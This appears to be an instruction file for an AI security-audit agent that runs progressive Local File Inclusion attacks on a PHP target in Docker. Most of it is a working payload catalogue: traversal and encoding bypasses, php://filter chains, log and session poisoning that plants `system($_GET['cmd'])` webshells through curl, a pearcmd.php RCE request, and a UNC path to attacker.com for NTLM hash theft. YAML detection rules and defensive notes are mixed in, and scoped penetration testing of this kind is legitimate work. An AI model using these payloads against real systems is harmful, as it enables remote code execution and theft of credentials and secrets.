> **Skill ID**: S-043-B | **Phase**: 4 | **Stage**: 2 (Attack)
> **Input**: attack_plans/{sink_id}_plan.json, Docker container access
> **Output**: exploit_results/{sink_id}_result.json, PoC脚本/{sink_id}_poc.py


## Identity

| Field | Value |
|-------|-------|
| Skill ID | S-043-B |
| Phase | Phase-4 (Attack) |
| Responsibility | Execute progressive multi-round attack against Local File Inclusion sinks |

## Input Contract

| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
| Container | Docker `php` container | ✅ | `exec` access |

## 🚨 CRITICAL Rules

| # | Rule | Consequence |
|---|------|-------------|
| CR-1 | Every `confirmed` verdict MUST have physical HTTP evidence: request URL + method + payload + response status + observable outcome | FAIL — evidence fabrication, finding rejected by QC |
| CR-2 | MUST NOT exceed 12 attack rounds — if stuck after round 10, execute Smart Pivot or Smart Skip | FAIL — resource exhaustion, blocks other auditors |
| CR-3 | MUST NOT attack routes not assigned in the task package — stay within allocated sink scope | FAIL — scope violation, duplicate work with other auditors |
| CR-4 | MUST read `$WORK_DIR/attack_plans/{sink_id}_plan.json` from Stage-1 before starting — do NOT re-analyze from scratch | FAIL — ignores Stage-1 analysis, wastes rounds on already-assessed vectors |
| CR-5 | MUST write exploit result to `$WORK_DIR/exploit_results/{sink_id}_result.json` conforming to `schemas/exploit_result.schema.json` | FAIL — downstream QC and report generation cannot process non-conformant output |
| CR-6 | MUST confirm file read by matching known file content patterns (e.g., `/etc/passwd` format, `<?php` header) — HTTP 200 alone does not confirm LFI | FAIL — false positive on custom 200 error pages |

## 8 Rounds of Attack

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R1 - Basic Path Traversal

Objective: Read /etc/passwd via directory traversal.

Payload:
- `../../../etc/passwd`
- `../../../../etc/passwd`
- `../../../../../../../etc/passwd`

Inject into all parameters flowing into target functions. Send requests testing GET, POST, and Cookie vectors. Increment `../` depth from 3 to 10 levels. Confirm via response content if response contains `root:x:0:0`.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R2 - URL Encoding & Double Encoding

Objective: Bypass input filters that block literal `../`.

Payload:
- Single encoding: `%2e%2e%2f` (`../`)
- Double encoding: `%252e%252e%252f`
- Mixed: `..%2f`, `%2e./`, `..%252f`
- UTF-8 overlong encoding: `%c0%ae%c0%ae%c0%af`

Apply each encoding variant to the traversal paths from R1. Send encoding variants one by one, testing both full and partial encoding.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R3 - PHP Filter Protocol Source Code Reading

Objective: Export PHP source code via php://filter.

Payload:
- `php://filter/convert.base64-encode/resource=index.php`
- `php://filter/convert.base64-encode/resource=config.php`
- `php://filter/read=string.rot13/resource=index.php`
- `php://filter/convert.iconv.utf-8.utf-16/resource=config.php`

Decode Base64 responses and verify whether they contain PHP source code. Enumerate common filenames: index.php, config.php, db.php, .env, wp-config.php.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R4 - Null Byte Truncation

Objective: Bypass suffix appending (PHP < 5.3.4).

Payload:
- `../../../etc/passwd%00`
- `../../../etc/passwd%00.php`
- `../../../etc/passwd\0`

Exploit scenarios where the application appends `.php` or other extensions. The null byte truncates the string at the OS level. Only send null byte payloads when PHP version < 5.3.4 or version is unknown.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R5 - Path Canonicalization Bypass

Objective: Bypass path-based filters through canonicalization tricks.

Payload:
- Dot-slash: `./../../etc/passwd`
- Double-slash: `..//..//etc/passwd`
- Backslash (Windows): `..\..\..\etc\passwd`
- Trailing dots: `../../../etc/passwd....`
- Mixed separators: `../..\/etc/passwd`

Exploit inconsistencies between filter parsing and OS path resolution.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R6 - Log File Injection + Inclusion

Objective: Inject PHP code into log files, then include for execution.

Steps:
1. Send a request with `<?php system('id'); ?>` in the User-Agent
2. Include the log file:
   - `/var/log/nginx/access.log`
   - `/var/log/apache2/access.log`
   - `/var/log/nginx/error.log`
   - `/var/log/httpd/access_log`

Confirm code execution via response output if `uid=` appears in the response. Can be combined with R2 encoding to bypass direct path filters.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R7 - Session File & Environ Inclusion

Objective: Include session files or /proc/self/environ to achieve code execution.

Session file inclusion:
1. Write `<?php system('id'); ?>` into a session variable via controllable input
2. Include `/tmp/sess_<PHPSESSID>` or `/var/lib/php/sessions/sess_<PHPSESSID>`

Proc environ inclusion:
1. Set User-Agent to `<?php system('id'); ?>`
2. Include `/proc/self/environ`

Also send requests one by one to test file descriptor inclusion from `/proc/self/fd/0` to `/proc/self/fd/10`.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R8 - Phar/Data/Input Protocol Combination

Objective: Achieve code execution through advanced PHP protocol wrappers.

Payload:
- `phar://uploads/avatar.jpg/shell.php` (requires crafting a phar disguised as an image)
- `data://text/plain,<?php system('id'); ?>`
- `data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==`
- `php://input` (POST body: `<?php system('id'); ?>`)

phar: Upload a phar archive with a .jpg extension, include via phar://. data/input: Use when allow_url_include is enabled.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R9 - PHP Filter Chain Arbitrary File Read (Enhanced)

Advanced php://filter techniques:

- **iconv filter chain**: Generate arbitrary bytes through chained `convert.iconv`
  ```
  php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|...|convert.base64-decode/resource=php://temp
  ```
- **Combined filters**:
  - `php://filter/read=convert.base64-encode|string.rot13/resource=file`
  - `php://filter/write=convert.base64-decode/resource=file`
  - `php://filter/zlib.deflate|convert.base64-encode/resource=file`
- **File fingerprinting**: Determine file existence based on filter error/success
- **Binary file reading**: `php://filter/convert.base64-encode` to read non-text files

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R10 - pearcmd.php Exploitation

Exploit PHP's built-in pearcmd.php to achieve LFI → RCE:

- Condition: `register_argc_argv=On` (enabled by default in Docker)
- Payload:
  ```
  GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=system('id')?>+/tmp/pear_proof.php
  ```
- Principle: pearcmd.php reads `$_SERVER['argv']` and writes to a config file
- Then include the written file via LFI
- Common paths: `/usr/local/lib/php/pearcmd.php`, `/usr/share/php/pearcmd.php`

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R11 - Container / Docker Specific Paths

Special exploitation paths in Docker environments:

- `/proc/self/environ` → Environment variables (may contain secrets)
- `/proc/self/cmdline` → Startup command and arguments
- `/proc/self/cgroup` → Determine if running inside a container
- `/proc/1/maps` → Memory mappings
- `/proc/net/tcp` → Internal network connections
- `/run/secrets/*` → Docker Secrets
- `/.dockerenv` → Container identification file
- `/var/run/docker.sock` → Docker Socket (container escape)

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R12 - Windows Specific Paths (Extended Coverage)

When the target is a Windows environment:

- `C:\Windows\win.ini`
- `C:\Windows\System32\drivers\etc\hosts`
- `C:\xampp\apache\conf\httpd.conf`
- `C:\xampp\php\php.ini`
- `C:\inetpub\wwwroot\web.config`
- UNC path: `\\attacker.com\share\file` (NTLM Hash theft)
- Short filename: `C:\PROGRA~1\` (8.3 format filter bypass)

## Workflow

1. Identify all parameters flowing into target functions through code review or fuzz testing
2. Execute in order from R1 to R8, escalating progressively upon failure
3. Send payloads one by one per round, testing all identified injection points
4. Record every request and response pair (with timestamps)
5. After confirming a vulnerability via response content, record the Payload, endpoint, parameter, and response excerpt
6. After all rounds are complete, generate a report sorted by severity

## Detection (Vulnerability Pattern Recognition)

The following code patterns indicate potential file inclusion/path traversal vulnerabilities:
- Pattern 1: `include($_GET['page'] . '.php')` / `require($userInput)` — User input directly passed to include/require
- Pattern 2: `file_get_contents("templates/" . $_GET['file'])` — User input concatenated into file read function path
- Pattern 3: `include("lang/" . $_COOKIE['lang'] . "/header.php")` — Non-obvious sources such as Cookie control file path
- Pattern 4: `$file = basename($_GET['file']); include("/pages/" . $file)` — Using `basename()` for security filtering but cannot block hidden files (.env/.htaccess)
- Pattern 5: `$path = realpath($base . $_GET['f']); if(strpos($path, $base) == 0)` — Loose comparison `==` is bypassed when `realpath()` returns false
- Pattern 6: `$ext = pathinfo($file, PATHINFO_EXTENSION); if($ext !== 'php')` — `pathinfo()` can be bypassed by trailing characters (`shell.php/.`)

## Key Insight

> **Key Point**: The core of LFI auditing is tracing whether user-controllable data flows into file operation functions like `include`/`require`/`file_get_contents`. PHP path handling functions (`basename`/`realpath`/`pathinfo`) each have blind spots and MUST NOT be relied upon as a single security check. Once LFI is confirmed, it can be escalated to RCE through three paths: php://filter chain, log poisoning, and session file inclusion.

### Smart Pivot (Stuck Detection)

When 3 consecutive rounds fail (current round ≥ 4), trigger a Smart Pivot:

1. Re-reconnaissance: Re-read target code to find overlooked filter logic and alternative entry points
2. Cross-intelligence: Review findings from other experts in the shared findings database (`$WORK_DIR/audit_session.db`)
3. Decision tree matching: Select a new attack direction based on failure patterns in `shared/pivot_strategy.md`
4. If no new paths are found, terminate early to avoid wasting rounds producing hallucinated results

## Prerequisites & Scoring (MUST be filled)

The output `exploit_results/{sink_id}_result.json` MUST include the following two objects:

### prerequisite_conditions (Prerequisites)
```json
{
  "auth_requirement": "anonymous|authenticated|admin|internal_network",
  "bypass_method": "Auth bypass method, null if none",
  "other_preconditions": ["Precondition 1", "Precondition 2"],
  "exploitability_judgment": "directly_exploitable|conditionally_exploitable|not_exploitable"
}
```
- `auth_requirement` MUST match the auth_level for that route in auth_matrix.json
- `exploitability_judgment = "not_exploitable"` → final_verdict is at most potential
- `other_preconditions` MUST list all non-auth prerequisites (e.g., PHP configuration, Composer dependencies, environment variables)

### severity (Three-dimensional scoring, see shared/severity_rating.md for details)
```json
{
  "reachability": 0-3, "reachability_reason": "...",
  "impact": 0-3, "impact_reason": "...",
  "complexity": 0-3, "complexity_reason": "...",
  "score": "R×0.40+I×0.35+C×0.25",
  "cvss": "(score/3.0)×10.0",
  "level": "C|H|M|L",
  "vuln_id": "C-LFI-001"
}
```
- All reason fields MUST be filled with specific justification; they MUST NOT be empty
- score and evidence_score MUST be consistent (≥2.10→≥7, 1.20-2.09→4-6, <1.20→1-3)

### Evidence Contract Reference (EVID)

Each vulnerability conclusion MUST reference the following evidence points in the `evidence` field (refer to `shared/evidence_contract.md`):
- `EVID_FILE_WRAPPER_PREFIX` — File protocol/wrapper prefix ✅Required
- `EVID_FILE_RESOLVED_TARGET` — Resolved target path ✅Required
- `EVID_FILE_INCLUDE_EXEC_BOUNDARY` — Include execution boundary ✅Required
- `EVID_FILE_TRAVERSAL_RESPONSE` — Traversal attack response evidence (Required when confirmed)

Missing required EVID → conclusion is automatically downgraded (confirmed→suspected→unverified).

### Attack Memory Write-back

After the attack cycle ends, write experience to the attack memory database (format per `shared/attack_memory.md` write protocol):

- ✅ confirmed: Record successful payload type + bypass technique + successful round
- ❌ failed (≥3 rounds): Record all excluded strategies + failure reasons
- ⚠️ partial: Record partially successful strategies + blocking reasons
- ❌ failed (<3 rounds): Do not record

Use `bash tools/audit_db.sh memory-write '<json>'` to write. SQLite WAL mode automatically ensures concurrency safety.

## Output

After all rounds are complete, write the final results to `$WORK_DIR/exploit_results/{sink_id}_result.json`.

> **Strictly generate the output file according to the fill-in template in `shared/OUTPUT_TEMPLATE.md`.**
> JSON structure follows `schemas/exploit_result.schema.json`; field constraints are in `shared/data_contracts.md` Section 9.
> Before submission, execute the 3 check commands at the bottom of OUTPUT_TEMPLATE.md.

## Real-time Sharing & Second-Order Tracking

### Shared Reading
Read the shared findings database before starting the attack phase; leverage file paths and bypass methods discovered by other auditors.

### Second-Order Tracking
Record paths/filenames written to DB/config in `$WORK_DIR/second_order/store_points.jsonl`.
Record locations where values retrieved from DB/config are used in include in `$WORK_DIR/second_order/use_points.jsonl`.

## Constraints

- MUST NOT modify or delete files on the target system
- Once a vulnerability of a specific severity level is confirmed for an endpoint, MUST stop testing that endpoint
- MUST comply with authorization scope
- MUST record all attempts (including failures) to ensure completeness

## php://filter Chain Attack

### Base64 Encoding Source Code Reading

The most basic filter usage, outputting PHP source code as Base64 encoding to prevent server-side parsing and execution:

```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config/database.php
php://filter/convert.base64-encode/resource=/etc/passwd
```

After decoding, the complete PHP source code is obtained, including sensitive information such as database credentials and API Keys.

### iconv Chain Arbitrary Content Write (RCE, PHP >= 7)

Through chained `convert.iconv` filters, arbitrary byte sequences can be constructed from scratch. The principle exploits conversion side effects between different character encodings to assemble the target payload byte by byte.

Core mechanism:
- Each `convert.iconv.X.Y` conversion introduces specific bytes into the output
- By carefully arranging multiple iconv conversions, any arbitrary ASCII character can be generated
- Finally, `convert.base64-decode` cleans up illegal characters, yielding clean PHP code

Tool reference: [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

```bash
# Generate a filter chain that writes <?php system($_GET['cmd']); ?>
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

### Common Target File List

| Category | File Path |
|----------|-----------|
| Application Config | `config.php`, `config/database.php`, `.env`, `wp-config.php` |
| Framework Config | `app/config/parameters.yml`, `config/app.php`, `.env.local` |
| System Files | `/etc/passwd`, `/etc/shadow`, `/etc/hosts` |
| Web Config | `/etc/nginx/nginx.conf`, `/etc/apache2/sites-enabled/000-default.conf` |
| PHP Config | `/etc/php/7.4/apache2/php.ini`, `/usr/local/etc/php/php.ini` |
| Log Files | `/var/log/apache2/access.log`, `/var/log/nginx/error.log` |
| Process Info | `/proc/self/environ`, `/proc/self/cmdline`, `/proc/version` |

### Filter Chain Payload Complete Examples

**Payload 1: Multi-layer encoding to bypass WAF for source code reading**

```
php://filter/convert.base64-encode|convert.base64-encode/resource=config.php
```

Double Base64 encoding, used to bypass WAFs that detect single-layer Base64 output. The client needs to decode twice.

**Payload 2: iconv + base64 combination to generate webshell**

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

This is a simplified example. In actual attacks, the `php_filter_chain_generator` tool MUST be used to generate a complete iconv chain for the target payload. The generated chain typically contains dozens of iconv conversion steps.

**Payload 3: zlib compression + Base64 for reading binary files**

```
php://filter/zlib.deflate|convert.base64-encode/resource=/etc/shadow
```

Used to reduce transfer size when reading binary or large files. The client first Base64 decodes, then zlib inflates.

**Payload 4: ROT13 + Base64 combination to bypass keyword detection**

```
php://filter/string.rot13|convert.base64-encode/resource=wp-config.php
```

ROT13 first then Base64, bypasses rules that detect Base64-encoded PHP tags. Decode order: Base64 decode → ROT13.

### Detection Rules

```yaml
- id: lfi_php_filter_chain
  pattern: 'php://filter/(convert\.iconv|convert\.base64|string\.rot13|zlib\.(deflate|inflate))'
  severity: critical
  description: "Detect php://filter chain attacks, including iconv chain RCE"
  tags: [lfi, php-filter, rce]

- id: lfi_filter_chain_length
  pattern: 'php://filter/.*(\|.*){3,}'
  severity: high
  description: "Detect overly long filter chains (3+ pipes), possibly an iconv chain attack"
```

### Key Insight

> The iconv chain technique for php://filter is currently one of the most powerful primitives for LFI → RCE. It does not depend on `allow_url_include`, does not require file write permissions, and only needs a single `include()` to achieve arbitrary code execution. Defense efforts MUST focus on restricting the use of `php://` protocols and detecting overly long filter chains at the WAF layer.

## Log Poisoning → RCE

### Apache/Nginx Access Log Path Probing

Log paths vary significantly across different operating systems and distributions, requiring one-by-one probing:

**Debian/Ubuntu:**
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
```

**RHEL/CentOS/Fedora:**
```
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
```

**FreeBSD:**
```
/var/log/httpd-access.log
/var/log/httpd-error.log
/var/log/nginx/access.log
```

**macOS (Homebrew):**
```
/usr/local/var/log/httpd/access_log
/usr/local/var/log/nginx/access.log
/opt/homebrew/var/log/httpd/access_log
/opt/homebrew/var/log/nginx/access.log
```

**Windows (XAMPP/WAMP):**
```
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\wamp\logs\access.log
```

**Docker common paths:**
```
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/fd/1  (stdout, Docker log driver)
/proc/self/fd/2  (stderr)
```

### User-Agent PHP Code Injection Technique

Core concept: Web servers log HTTP request headers (including User-Agent) into the access log. By embedding PHP code in the User-Agent, when the log file is `include()`'d, the PHP parser will execute the code within it.

**Step 1: Inject payload into logs**
```http
GET / HTTP/1.1
Host: target.com
User-Agent: <?php system($_GET['cmd']); ?>
```

**Step 2: Include log file via LFI**
```
GET /page.php?file=../../../var/log/apache2/access.log&cmd=id
```

Notes:
- Some web servers URL-encode special characters before writing to logs, preventing PHP code execution
- Nginx encodes by default; Apache does not encode User-Agent by default
- If User-Agent is encoded, try the Referer or other header fields
- `include()` may time out or cause memory overflow when log files are too large

### /proc/self/environ Injection

`/proc/self/environ` contains the current process's environment variables, where HTTP headers like `HTTP_USER_AGENT` are written into environment variables by CGI/FastCGI.

```http
GET /page.php?file=../../../proc/self/environ HTTP/1.1
Host: target.com
User-Agent: <?php system('id'); ?>
```

When PHP runs in CGI mode, environ will contain:
```
HTTP_USER_AGENT=<?php system('id'); ?>
```

This is executed when `include()`'d.

Limitations:
- Only applicable in CGI/FastCGI mode
- Usually unavailable under modern PHP-FPM configurations
- Requires readable `/proc` filesystem

### Session File Injection (`/tmp/sess_*`)

PHP session files are stored on the server disk. If user input is written into session variables, PHP code can be injected.

**Common session file paths:**
```
/tmp/sess_<PHPSESSID>
/var/lib/php/sessions/sess_<PHPSESSID>
/var/lib/php5/sess_<PHPSESSID>
/var/lib/php/sess_<PHPSESSID>
C:\Windows\Temp\sess_<PHPSESSID>
```

**Attack steps:**

1. Find functionality that stores user input into sessions (e.g., username, language preference)
2. Inject PHP code into the session variable:
   ```http
   POST /login.php HTTP/1.1
   Cookie: PHPSESSID=abc123def456

   username=<?php system($_GET['cmd']); ?>&password=anything
   ```
3. Include the session file via LFI:
   ```
   GET /page.php?file=../../../tmp/sess_abc123def456&cmd=id
   ```

### Complete Attack Steps: Inject → Trigger → Verify

**Phase 1: Information Gathering**
- Confirm LFI vulnerability exists through R1-R5 path traversal
- Probe the target OS and web server type (via response headers)
- Enumerate readable log file paths

**Phase 2: Inject**
```bash
# Method A: User-Agent injection into access log
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/

# Method B: Session injection
curl -b 'PHPSESSID=attacker_session' -d 'lang=<?php system($_GET["cmd"]); ?>' http://target.com/setlang.php

# Method C: Referer injection (alternative)
curl -e '<?php system($_GET["cmd"]); ?>' http://target.com/
```

**Phase 3: Trigger**
```
# Include the poisoned log/session file
GET /page.php?file=../../../var/log/apache2/access.log&cmd=id
GET /page.php?file=../../../tmp/sess_attacker_session&cmd=id
GET /page.php?file=../../../proc/self/environ&cmd=id
```

**Phase 4: Verify**
- Confirm RCE via response marker if `uid=` appears in the response body
- If command output is truncated, try `cmd=id|base64` then decode
- After confirmation via the above method, immediately record payload, endpoint, and response excerpt

### Detection Rules

```yaml
- id: log_poisoning_ua_injection
  pattern: 'User-Agent:.*<\?php'
  severity: critical
  description: "Detect PHP code injection in User-Agent (Log Poisoning precursor)"
  layer: WAF/IDS

- id: lfi_log_file_inclusion
  pattern: '(file|page|path|include)=.*(access\.log|error\.log|access_log|error_log)'
  severity: critical
  description: "Detect attempts to include log files via LFI"

- id: lfi_session_inclusion
  pattern: '(file|page|path|include)=.*/sess_[a-zA-Z0-9]+'
  severity: critical
  description: "Detect attempts to include session files via LFI"

- id: lfi_proc_environ
  pattern: '(file|page|path|include)=.*/proc/self/environ'
  severity: critical
  description: "Detect attempts to include /proc/self/environ via LFI"
```

### Key Insight

> Log Poisoning is the classic escalation path from LFI → RCE. The defense key lies in: (1) Log files SHOULD NOT be readable by the web user; (2) Parameters to `include()` MUST use a whitelist; (3) Detect PHP tags in HTTP headers at the WAF layer. Note that Nginx URL-encodes User-Agent by default, so attackers may pivot to error logs (injecting PHP code into the path by triggering 404s).

## basename() / Path Function Bypass

### basename() Does Not Filter Hidden Files

`basename()` is commonly used to "safely" extract filenames, but it is completely ineffective against hidden files starting with a dot:

```php
// Developer assumes basename() restricts to current directory
$file = basename($_GET['file']);
include("/templates/" . $file);

// Attacker can access hidden files
// ?file=.htaccess  →  basename() returns ".htaccess"
// ?file=.env        →  basename() returns ".env"
// ?file=.git/config →  basename() returns "config"
```

More critically, basename() exhibits anomalous behavior with certain multi-byte characters (PHP < 8.0):

```php
// Under certain locales, basename() may incorrectly handle paths
basename("../\x80etc/passwd");  // May return unexpected results
```

### realpath() Empty Return Exploitation

`realpath()` returns `false` when the path does not exist, a fact developers often overlook:

```php
// Incorrect security check
$path = realpath($base_dir . '/' . $_GET['file']);
if (strpos($path, $base_dir) === 0) {
    include($path);
}

// When realpath() returns false:
// strpos(false, "/var/www") === false
// false === 0 is false, but some comparison methods may pass:
// strpos(false, "/var/www") == 0  →  true! (loose comparison trap)
```

Exploitation methods:
- Provide a non-existent path to make `realpath()` return `false`
- Combine with PHP loose type comparison (`==` vs `===`) to bypass the check
- If the developer uses `!realpath()` for error detection but does not properly handle `false`

### pathinfo() Extension Manipulation

The extension extraction logic of `pathinfo()` can be exploited to bypass file type checks:

```php
// Developer checks extension
$ext = pathinfo($_GET['file'], PATHINFO_EXTENSION);
if ($ext === 'php') { die('blocked'); }

// Bypass methods:
// ?file=shell.php.     →  PATHINFO_EXTENSION = "" (empty)
// ?file=shell.php/     →  PATHINFO_EXTENSION = "" (empty)
// ?file=shell.php/.    →  PATHINFO_EXTENSION = "" (empty)
// ?file=shell.pHp      →  PATHINFO_EXTENSION = "pHp" (case variation)
// ?file=shell.php%00.jpg → PATHINFO_EXTENSION = "jpg" (null byte, old PHP)
```

Combined exploitation:
```php
// pathinfo extracts empty extension, bypassing the check
// But include() still correctly resolves shell.php/. to shell.php
$file = $_GET['file'];
$ext = pathinfo($file, PATHINFO_EXTENSION);
if (!in_array($ext, ['html', 'txt'])) { /* May pass due to empty extension */ }
include("/pages/" . $file);  // shell.php/. is still resolved
```

### Detection Rules

```yaml
- id: bypass_hidden_file_access
  pattern: '(file|page|path|include)=\.[a-zA-Z]'
  severity: medium
  description: "Detect direct hidden file access via parameters (.htaccess, .env, etc.)"

- id: bypass_pathinfo_trailing
  pattern: '\.php[/\.\%]'
  severity: medium
  description: "Detect pathinfo() extension extraction manipulation via trailing characters"

- id: bypass_realpath_null
  pattern: '(file|path)=.*\x00'
  severity: high
  description: "Detect null byte injection to bypass realpath() check"
```

### Key Insight

> PHP path handling functions each have blind spots: `basename()` cannot block hidden file access, `realpath()`'s false return value is a fatal trap in loose comparisons, and `pathinfo()`'s extension extraction can be broken by trailing characters. The secure approach is to use a whitelist + `===` strict comparison + multi-layer validation combination, rather than relying on any single path function.

## Path Traversal WAF Bypass Quick Reference

### Double Encoding

WAF decodes once and checks, but the application decodes once more:

```
Original:    ../
Single enc:  %2e%2e%2f
Double enc:  %252e%252e%252f

../../../etc/passwd
→ %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

Applicable to scenarios where the WAF only performs one layer of URL decoding. Some Java/Tomcat applications automatically perform double decoding.

### Brace Bypass

Exploit brace expansion supported by shells or certain parsers:

```
{....}//....//etc/passwd
..{.}./..{.}./etc/passwd
```

Some WAF regex patterns do not match dot sequences wrapped in braces.

### UTF-8 Overlong Encoding

Represent single-byte characters with multi-byte sequences to bypass byte-level detection:

```
.  → %c0%2e (2-byte overlong)
.  → %e0%80%2e (3-byte overlong)
/  → %c0%af (2-byte overlong)
/  → %e0%80%af (3-byte overlong)

../  → %c0%2e%c0%2e%c0%af
```

Note: Modern PHP/web servers mostly reject overlong encoding, but older versions of Tomcat, IIS, etc. may still accept it.

### Mixed Slashes

Windows systems accept both `/` and `\`:

```
..\../..\etc/passwd
..\/..\/etc\passwd
....\\....//etc/passwd
```

Some WAFs only check `../` but not `..\`. Particularly effective in Windows + IIS environments.

### Other Encoding Variant Quick Reference

| Technique | Payload | Description |
|-----------|---------|-------------|
| Dot URL encoding | `%2e%2e/` | Encode dots but not slashes |
| Slash URL encoding | `..%2f` | Encode slashes but not dots |
| 16-bit Unicode | `..%u2215` | Unicode slash (∕) |
| Double backslash | `..\\..\\` | Windows path |
| Tab/space injection | `./. ./` | Insert whitespace between path separators |
| Redundant traversal | `valid/../../../etc/passwd` | Enter a legitimate directory first then back out |
| Current dir injection | `./././../../../etc/passwd` | Numerous `./` may bypass length-based detection |

### Python `os.path.join` Absolute Path Injection (Mixed Projects)

In PHP + Python mixed projects, Python backend's `os.path.join()` has a critical behavior:

```python
import os
# If any component is an absolute path, all previous components are discarded!
os.path.join("/safe/base/", user_input)

# user_input = "/etc/passwd"
# Result: "/etc/passwd"  (not "/safe/base//etc/passwd")

# user_input = "../../etc/passwd"
# Result: "/safe/base/../../etc/passwd"  → traversal is still possible
```

In architectures where PHP calls Python microservices, even if the PHP layer filters properly, Python's `os.path.join` may completely ignore the base path:

```php
// PHP layer filtered ../
$safe_name = str_replace('../', '', $_GET['file']);
// $safe_name = "/etc/passwd" (no ../ so it passes)

// Passed to Python microservice
$result = call_python_service("read_template", $safe_name);

// Python side
# os.path.join("/templates/", "/etc/passwd") → "/etc/passwd"
```

### Detection Rules

```yaml
- id: waf_bypass_double_encoding
  pattern: '%25[0-9a-fA-F]{2}'
  severity: high
  description: "Detect double URL encoding (common WAF bypass technique)"

- id: waf_bypass_overlong_utf8
  pattern: '%c0%[0-9a-fA-F]{2}|%e0%80%[0-9a-fA-F]{2}'
  severity: high
  description: "Detect UTF-8 overlong encoding (classic path traversal bypass)"

- id: waf_bypass_mixed_slash
  pattern: '\.\.[/\\].*\.\.[/\\]'
  severity: medium
  description: "Detect mixed slash path traversal (key focus for Windows environments)"

- id: waf_bypass_absolute_path_param
  pattern: '(file|path|template|page)=[/\\]'
  severity: medium
  description: "Detect parameter values starting with absolute path (os.path.join injection)"

- id: waf_bypass_unicode_slash
  pattern: '%u2215|%u2216|%uff0f'
  severity: medium
  description: "Detect Unicode-encoded slash characters"
```

### Key Insight

> The essence of WAF bypass is exploiting the difference between WAF parsing and backend application parsing (parser differential). The most effective defense is not stacking rules at the WAF layer, but using whitelist + `realpath()` strict comparison at the application layer. For mixed-language projects, path security checks MUST be independently implemented at each layer (PHP, Python, Node), because path handling semantics may be completely different across cross-language calls. Python's `os.path.join` absolute path override is one of the most easily overlooked cross-layer vulnerabilities.



## Output Contract

| Output File | Path | Description |
|-------------|------|-------------|
| Exploit result | `$WORK_DIR/exploit_results/{sink_id}_result.json` | Final verdict + all round records |
